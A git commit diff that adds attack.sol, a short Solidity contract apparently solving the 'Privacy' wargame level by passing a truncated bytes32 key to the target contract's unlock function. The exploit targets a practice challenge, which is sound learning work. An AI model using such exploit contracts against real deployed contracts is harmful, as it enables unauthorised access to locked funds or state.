08c002cf86860717e6edae46c1e493e7fa42d74d
donghyeon <tsvz1234@gmail.com>
2024-07-10 00:27:36 +0900

    Update attack.sol

--- Privacy/attack.sol
+++ Privacy/attack.sol
@@ -1,1 +1,17 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+import "./Privacy.sol";
 
+contract _unlock {
+    Privacy public privacy;
+
+    constructor (address _address) {
+        privacy = Privacy(_address);
+    }
+
+    function Unlock(bytes32 _key) public {
+        bytes16 key = bytes16(_key);
+        privacy.unlock(key);
+    }
+
+}
